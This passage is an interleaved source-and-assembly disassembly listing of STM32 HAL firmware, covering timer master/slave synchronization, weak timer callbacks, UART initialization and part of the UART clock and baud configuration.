 8005630:	2b01      	cmp	r3, #1
 8005632:	d101      	bne.n	8005638 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 8005634:	2302      	movs	r3, #2
 8005636:	e04f      	b.n	80056d8 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 8005638:	687b      	ldr	r3, [r7, #4]
 800563a:	2201      	movs	r2, #1
 800563c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 8005640:	687b      	ldr	r3, [r7, #4]
 8005642:	2202      	movs	r2, #2
 8005644:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 8005648:	687b      	ldr	r3, [r7, #4]
 800564a:	681b      	ldr	r3, [r3, #0]
 800564c:	685b      	ldr	r3, [r3, #4]
 800564e:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 8005650:	687b      	ldr	r3, [r7, #4]
 8005652:	681b      	ldr	r3, [r3, #0]
 8005654:	689b      	ldr	r3, [r3, #8]
 8005656:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 8005658:	687b      	ldr	r3, [r7, #4]
 800565a:	681b      	ldr	r3, [r3, #0]
 800565c:	4a21      	ldr	r2, [pc, #132]	; (80056e4 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 800565e:	4293      	cmp	r3, r2
 8005660:	d108      	bne.n	8005674 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 8005662:	68fb      	ldr	r3, [r7, #12]
 8005664:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 8005668:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 800566a:	683b      	ldr	r3, [r7, #0]
 800566c:	685b      	ldr	r3, [r3, #4]
 800566e:	68fa      	ldr	r2, [r7, #12]
 8005670:	4313      	orrs	r3, r2
 8005672:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 8005674:	68fb      	ldr	r3, [r7, #12]
 8005676:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800567a:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 800567c:	683b      	ldr	r3, [r7, #0]
 800567e:	681b      	ldr	r3, [r3, #0]
 8005680:	68fa      	ldr	r2, [r7, #12]
 8005682:	4313      	orrs	r3, r2
 8005684:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 8005686:	687b      	ldr	r3, [r7, #4]
 8005688:	681b      	ldr	r3, [r3, #0]
 800568a:	68fa      	ldr	r2, [r7, #12]
 800568c:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 800568e:	687b      	ldr	r3, [r7, #4]
 8005690:	681b      	ldr	r3, [r3, #0]
 8005692:	4a14      	ldr	r2, [pc, #80]	; (80056e4 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005694:	4293      	cmp	r3, r2
 8005696:	d009      	beq.n	80056ac <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005698:	687b      	ldr	r3, [r7, #4]
 800569a:	681b      	ldr	r3, [r3, #0]
 800569c:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80056a0:	d004      	beq.n	80056ac <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80056a2:	687b      	ldr	r3, [r7, #4]
 80056a4:	681b      	ldr	r3, [r3, #0]
 80056a6:	4a10      	ldr	r2, [pc, #64]	; (80056e8 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 80056a8:	4293      	cmp	r3, r2
 80056aa:	d10c      	bne.n	80056c6 <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 80056ac:	68bb      	ldr	r3, [r7, #8]
 80056ae:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 80056b2:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 80056b4:	683b      	ldr	r3, [r7, #0]
 80056b6:	689b      	ldr	r3, [r3, #8]
 80056b8:	68ba      	ldr	r2, [r7, #8]
 80056ba:	4313      	orrs	r3, r2
 80056bc:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 80056be:	687b      	ldr	r3, [r7, #4]
 80056c0:	681b      	ldr	r3, [r3, #0]
 80056c2:	68ba      	ldr	r2, [r7, #8]
 80056c4:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 80056c6:	687b      	ldr	r3, [r7, #4]
 80056c8:	2201      	movs	r2, #1
 80056ca:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 80056ce:	687b      	ldr	r3, [r7, #4]
 80056d0:	2200      	movs	r2, #0
 80056d2:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 80056d6:	2300      	movs	r3, #0
}
 80056d8:	4618      	mov	r0, r3
 80056da:	3714      	adds	r7, #20
 80056dc:	46bd      	mov	sp, r7
 80056de:	f85d 7b04 	ldr.w	r7, [sp], #4
 80056e2:	4770      	bx	lr
 80056e4:	40012c00 	.word	0x40012c00
 80056e8:	40014000 	.word	0x40014000

080056ec <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 80056ec:	b480      	push	{r7}
 80056ee:	b083      	sub	sp, #12
 80056f0:	af00      	add	r7, sp, #0
 80056f2:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 80056f4:	bf00      	nop
 80056f6:	370c      	adds	r7, #12
 80056f8:	46bd      	mov	sp, r7
 80056fa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80056fe:	4770      	bx	lr

08005700 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 8005700:	b480      	push	{r7}
 8005702:	b083      	sub	sp, #12
 8005704:	af00      	add	r7, sp, #0
 8005706:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 8005708:	bf00      	nop
 800570a:	370c      	adds	r7, #12
 800570c:	46bd      	mov	sp, r7
 800570e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005712:	4770      	bx	lr

08005714 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 8005714:	b480      	push	{r7}
 8005716:	b083      	sub	sp, #12
 8005718:	af00      	add	r7, sp, #0
 800571a:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 800571c:	bf00      	nop
 800571e:	370c      	adds	r7, #12
 8005720:	46bd      	mov	sp, r7
 8005722:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005726:	4770      	bx	lr

08005728 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 8005728:	b580      	push	{r7, lr}
 800572a:	b082      	sub	sp, #8
 800572c:	af00      	add	r7, sp, #0
 800572e:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 8005730:	687b      	ldr	r3, [r7, #4]
 8005732:	2b00      	cmp	r3, #0
 8005734:	d101      	bne.n	800573a <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 8005736:	2301      	movs	r3, #1
 8005738:	e040      	b.n	80057bc <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 800573a:	687b      	ldr	r3, [r7, #4]
 800573c:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 800573e:	2b00      	cmp	r3, #0
 8005740:	d106      	bne.n	8005750 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 8005742:	687b      	ldr	r3, [r7, #4]
 8005744:	2200      	movs	r2, #0
 8005746:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 800574a:	6878      	ldr	r0, [r7, #4]
 800574c:	f7fb fd78 	bl	8001240 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 8005750:	687b      	ldr	r3, [r7, #4]
 8005752:	2224      	movs	r2, #36	; 0x24
 8005754:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 8005756:	687b      	ldr	r3, [r7, #4]
 8005758:	681b      	ldr	r3, [r3, #0]
 800575a:	681a      	ldr	r2, [r3, #0]
 800575c:	687b      	ldr	r3, [r7, #4]
 800575e:	681b      	ldr	r3, [r3, #0]
 8005760:	f022 0201 	bic.w	r2, r2, #1
 8005764:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 8005766:	687b      	ldr	r3, [r7, #4]
 8005768:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800576a:	2b00      	cmp	r3, #0
 800576c:	d002      	beq.n	8005774 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 800576e:	6878      	ldr	r0, [r7, #4]
 8005770:	f000 fa54 	bl	8005c1c <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 8005774:	6878      	ldr	r0, [r7, #4]
 8005776:	f000 f825 	bl	80057c4 <UART_SetConfig>
 800577a:	4603      	mov	r3, r0
 800577c:	2b01      	cmp	r3, #1
 800577e:	d101      	bne.n	8005784 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 8005780:	2301      	movs	r3, #1
 8005782:	e01b      	b.n	80057bc <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 8005784:	687b      	ldr	r3, [r7, #4]
 8005786:	681b      	ldr	r3, [r3, #0]
 8005788:	685a      	ldr	r2, [r3, #4]
 800578a:	687b      	ldr	r3, [r7, #4]
 800578c:	681b      	ldr	r3, [r3, #0]
 800578e:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 8005792:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 8005794:	687b      	ldr	r3, [r7, #4]
 8005796:	681b      	ldr	r3, [r3, #0]
 8005798:	689a      	ldr	r2, [r3, #8]
 800579a:	687b      	ldr	r3, [r7, #4]
 800579c:	681b      	ldr	r3, [r3, #0]
 800579e:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 80057a2:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 80057a4:	687b      	ldr	r3, [r7, #4]
 80057a6:	681b      	ldr	r3, [r3, #0]
 80057a8:	681a      	ldr	r2, [r3, #0]
 80057aa:	687b      	ldr	r3, [r7, #4]
 80057ac:	681b      	ldr	r3, [r3, #0]
 80057ae:	f042 0201 	orr.w	r2, r2, #1
 80057b2:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 80057b4:	6878      	ldr	r0, [r7, #4]
 80057b6:	f000 fad3 	bl	8005d60 <UART_CheckIdleState>
 80057ba:	4603      	mov	r3, r0
}
 80057bc:	4618      	mov	r0, r3
 80057be:	3708      	adds	r7, #8
 80057c0:	46bd      	mov	sp, r7
 80057c2:	bd80      	pop	{r7, pc}

080057c4 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 80057c4:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 80057c8:	b08a      	sub	sp, #40	; 0x28
 80057ca:	af00      	add	r7, sp, #0
 80057cc:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 80057ce:	2300      	movs	r3, #0
 80057d0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 80057d4:	68fb      	ldr	r3, [r7, #12]
 80057d6:	689a      	ldr	r2, [r3, #8]
 80057d8:	68fb      	ldr	r3, [r7, #12]
 80057da:	691b      	ldr	r3, [r3, #16]
 80057dc:	431a      	orrs	r2, r3
 80057de:	68fb      	ldr	r3, [r7, #12]
 80057e0:	695b      	ldr	r3, [r3, #20]
 80057e2:	431a      	orrs	r2, r3
 80057e4:	68fb      	ldr	r3, [r7, #12]
 80057e6:	69db      	ldr	r3, [r3, #28]
 80057e8:	4313      	orrs	r3, r2
 80057ea:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 80057ec:	68fb      	ldr	r3, [r7, #12]
 80057ee:	681b      	ldr	r3, [r3, #0]
 80057f0:	681a      	ldr	r2, [r3, #0]
 80057f2:	4bb4      	ldr	r3, [pc, #720]	; (8005ac4 <UART_SetConfig+0x300>)
 80057f4:	4013      	ands	r3, r2
 80057f6:	68fa      	ldr	r2, [r7, #12]
 80057f8:	6812      	ldr	r2, [r2, #0]
 80057fa:	6a79      	ldr	r1, [r7, #36]	; 0x24
 80057fc:	430b      	orrs	r3, r1
 80057fe:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8005800:	68fb      	ldr	r3, [r7, #12]
 8005802:	681b      	ldr	r3, [r3, #0]
 8005804:	685b      	ldr	r3, [r3, #4]
 8005806:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 800580a:	68fb      	ldr	r3, [r7, #12]
 800580c:	68da      	ldr	r2, [r3, #12]
 800580e:	68fb      	ldr	r3, [r7, #12]
 8005810:	681b      	ldr	r3, [r3, #0]
 8005812:	430a      	orrs	r2, r1
 8005814:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 8005816:	68fb      	ldr	r3, [r7, #12]
 8005818:	699b      	ldr	r3, [r3, #24]
 800581a:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 800581c:	68fb      	ldr	r3, [r7, #12]
 800581e:	681b      	ldr	r3, [r3, #0]
 8005820:	4aa9      	ldr	r2, [pc, #676]	; (8005ac8 <UART_SetConfig+0x304>)
 8005822:	4293      	cmp	r3, r2
 8005824:	d004      	beq.n	8005830 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 8005826:	68fb      	ldr	r3, [r7, #12]
 8005828:	6a1b      	ldr	r3, [r3, #32]
 800582a:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 800582c:	4313      	orrs	r3, r2
 800582e:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 8005830:	68fb      	ldr	r3, [r7, #12]
 8005832:	681b      	ldr	r3, [r3, #0]
 8005834:	689b      	ldr	r3, [r3, #8]
 8005836:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 800583a:	68fb      	ldr	r3, [r7, #12]
 800583c:	681b      	ldr	r3, [r3, #0]
 800583e:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005840:	430a      	orrs	r2, r1
 8005842:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 8005844:	68fb      	ldr	r3, [r7, #12]
 8005846:	681b      	ldr	r3, [r3, #0]
 8005848:	4aa0      	ldr	r2, [pc, #640]	; (8005acc <UART_SetConfig+0x308>)
 800584a:	4293      	cmp	r3, r2
 800584c:	d126      	bne.n	800589c <UART_SetConfig+0xd8>
 800584e:	4ba0      	ldr	r3, [pc, #640]	; (8005ad0 <UART_SetConfig+0x30c>)
 8005850:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005854:	f003 0303 	and.w	r3, r3, #3
 8005858:	2b03      	cmp	r3, #3
 800585a:	d81b      	bhi.n	8005894 <UART_SetConfig+0xd0>
 800585c:	a201      	add	r2, pc, #4	; (adr r2, 8005864 <UART_SetConfig+0xa0>)
 800585e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005862:	bf00      	nop
 8005864:	08005875 	.word	0x08005875
 8005868:	08005885 	.word	0x08005885
 800586c:	0800587d 	.word	0x0800587d
 8005870:	0800588d 	.word	0x0800588d
 8005874:	2301      	movs	r3, #1
 8005876:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800587a:	e080      	b.n	800597e <UART_SetConfig+0x1ba>
 800587c:	2302      	movs	r3, #2
 800587e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005882:	e07c      	b.n	800597e <UART_SetConfig+0x1ba>
 8005884:	2304      	movs	r3, #4
 8005886:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800588a:	e078      	b.n	800597e <UART_SetConfig+0x1ba>
 800588c:	2308      	movs	r3, #8
 800588e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005892:	e074      	b.n	800597e <UART_SetConfig+0x1ba>
 8005894:	2310      	movs	r3, #16
 8005896:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800589a:	e070      	b.n	800597e <UART_SetConfig+0x1ba>
 800589c:	68fb      	ldr	r3, [r7, #12]
 800589e:	681b      	ldr	r3, [r3, #0]
 80058a0:	4a8c      	ldr	r2, [pc, #560]	; (8005ad4 <UART_SetConfig+0x310>)
 80058a2:	4293      	cmp	r3, r2
 80058a4:	d138      	bne.n	8005918 <UART_SetConfig+0x154>
 80058a6:	4b8a      	ldr	r3, [pc, #552]	; (8005ad0 <UART_SetConfig+0x30c>)
 80058a8:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80058ac:	f003 030c 	and.w	r3, r3, #12
 80058b0:	2b0c      	cmp	r3, #12
 80058b2:	d82d      	bhi.n	8005910 <UART_SetConfig+0x14c>
 80058b4:	a201      	add	r2, pc, #4	; (adr r2, 80058bc <UART_SetConfig+0xf8>)
 80058b6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80058ba:	bf00      	nop
 80058bc:	080058f1 	.word	0x080058f1
 80058c0:	08005911 	.word	0x08005911
 80058c4:	08005911 	.word	0x08005911
 80058c8:	08005911 	.word	0x08005911
 80058cc:	08005901 	.word	0x08005901
 80058d0:	08005911 	.word	0x08005911
 80058d4:	08005911 	.word	0x08005911
 80058d8:	08005911 	.word	0x08005911
 80058dc:	080058f9 	.word	0x080058f9
 80058e0:	08005911 	.word	0x08005911
 80058e4:	08005911 	.word	0x08005911
 80058e8:	08005911 	.word	0x08005911
 80058ec:	08005909 	.word	0x08005909
 80058f0:	2300      	movs	r3, #0
 80058f2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058f6:	e042      	b.n	800597e <UART_SetConfig+0x1ba>
 80058f8:	2302      	movs	r3, #2
 80058fa:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058fe:	e03e      	b.n	800597e <UART_SetConfig+0x1ba>
 8005900:	2304      	movs	r3, #4
 8005902:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005906:	e03a      	b.n	800597e <UART_SetConfig+0x1ba>
 8005908:	2308      	movs	r3, #8
 800590a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800590e:	e036      	b.n	800597e <UART_SetConfig+0x1ba>
 8005910:	2310      	movs	r3, #16
 8005912:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005916:	e032      	b.n	800597e <UART_SetConfig+0x1ba>
 8005918:	68fb      	ldr	r3, [r7, #12]
 800591a:	681b      	ldr	r3, [r3, #0]
 800591c:	4a6a      	ldr	r2, [pc, #424]	; (8005ac8 <UART_SetConfig+0x304>)
 800591e:	4293      	cmp	r3, r2
 8005920:	d12a      	bne.n	8005978 <UART_SetConfig+0x1b4>
 8005922:	4b6b      	ldr	r3, [pc, #428]	; (8005ad0 <UART_SetConfig+0x30c>)
 8005924:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005928:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 800592c:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005930:	d01a      	beq.n	8005968 <UART_SetConfig+0x1a4>
 8005932:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005936:	d81b      	bhi.n	8005970 <UART_SetConfig+0x1ac>
 8005938:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 800593c:	d00c      	beq.n	8005958 <UART_SetConfig+0x194>
 800593e:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005942:	d815      	bhi.n	8005970 <UART_SetConfig+0x1ac>
 8005944:	2b00      	cmp	r3, #0
 8005946:	d003      	beq.n	8005950 <UART_SetConfig+0x18c>
 8005948:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800594c:	d008      	beq.n	8005960 <UART_SetConfig+0x19c>
 800594e:	e00f      	b.n	8005970 <UART_SetConfig+0x1ac>
 8005950:	2300      	movs	r3, #0
 8005952:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005956:	e012      	b.n	800597e <UART_SetConfig+0x1ba>
 8005958:	2302      	movs	r3, #2
 800595a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800595e:	e00e      	b.n	800597e <UART_SetConfig+0x1ba>
 8005960:	2304      	movs	r3, #4
 8005962:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005966:	e00a      	b.n	800597e <UART_SetConfig+0x1ba>
 8005968:	2308      	movs	r3, #8
 800596a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800596e:	e006      	b.n	800597e <UART_SetConfig+0x1ba>
 8005970:	2310      	movs	r3, #16
 8005972:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005976:	e002      	b.n	800597e <UART_SetConfig+0x1ba>
 8005978:	2310      	movs	r3, #16
 800597a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 800597e:	68fb      	ldr	r3, [r7, #12]
 8005980:	681b      	ldr	r3, [r3, #0]
 8005982:	4a51      	ldr	r2, [pc, #324]	; (8005ac8 <UART_SetConfig+0x304>)
 8005984:	4293      	cmp	r3, r2
 8005986:	d17a      	bne.n	8005a7e <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 8005988:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 800598c:	2b08      	cmp	r3, #8
 800598e:	d824      	bhi.n	80059da <UART_SetConfig+0x216>
 8005990:	a201      	add	r2, pc, #4	; (adr r2, 8005998 <UART_SetConfig+0x1d4>)
 8005992:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005996:	bf00      	nop
 8005998:	080059bd 	.word	0x080059bd
 800599c:	080059db 	.word	0x080059db
 80059a0:	080059c5 	.word	0x080059c5
 80059a4:	080059db 	.word	0x080059db
 80059a8:	080059cb 	.word	0x080059cb
 80059ac:	080059db 	.word	0x080059db
 80059b0:	080059db 	.word	0x080059db
 80059b4:	080059db 	.word	0x080059db
 80059b8:	080059d3 	.word	0x080059d3
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 80059bc:	f7fe fe6c 	bl	8004698 <HAL_RCC_GetPCLK1Freq>
 80059c0:	61f8      	str	r0, [r7, #28]
        break;
 80059c2:	e010      	b.n	80059e6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 80059c4:	4b44      	ldr	r3, [pc, #272]	; (8005ad8 <UART_SetConfig+0x314>)
 80059c6:	61fb      	str	r3, [r7, #28]
        break;
 80059c8:	e00d      	b.n	80059e6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 80059ca:	f7fe fdcd 	bl	8004568 <HAL_RCC_GetSysClockFreq>
 80059ce:	61f8      	str	r0, [r7, #28]
        break;
 80059d0:	e009      	b.n	80059e6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 80059d2:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80059d6:	61fb      	str	r3, [r7, #28]
        break;
 80059d8:	e005      	b.n	80059e6 <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 80059da:	2300      	movs	r3, #0
 80059dc:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 80059de:	2301      	movs	r3, #1
 80059e0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 80059e4:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 80059e6:	69fb      	ldr	r3, [r7, #28]
 80059e8:	2b00      	cmp	r3, #0
 80059ea:	f000 8107 	beq.w	8005bfc <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80059ee:	68fb      	ldr	r3, [r7, #12]
 80059f0:	685a      	ldr	r2, [r3, #4]
 80059f2:	4613      	mov	r3, r2
 80059f4:	005b      	lsls	r3, r3, #1
 80059f6:	4413      	add	r3, r2
 80059f8:	69fa      	ldr	r2, [r7, #28]
 80059fa:	429a      	cmp	r2, r3
 80059fc:	d305      	bcc.n	8005a0a <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 80059fe:	68fb      	ldr	r3, [r7, #12]
 8005a00:	685b      	ldr	r3, [r3, #4]
 8005a02:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005a04:	69fa      	ldr	r2, [r7, #28]
 8005a06:	429a      	cmp	r2, r3
 8005a08:	d903      	bls.n	8005a12 <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 8005a0a:	2301      	movs	r3, #1
 8005a0c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005a10:	e0f4      	b.n	8005bfc <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 8005a12:	69fb      	ldr	r3, [r7, #28]
 8005a14:	2200      	movs	r2, #0
 8005a16:	461c      	mov	r4, r3
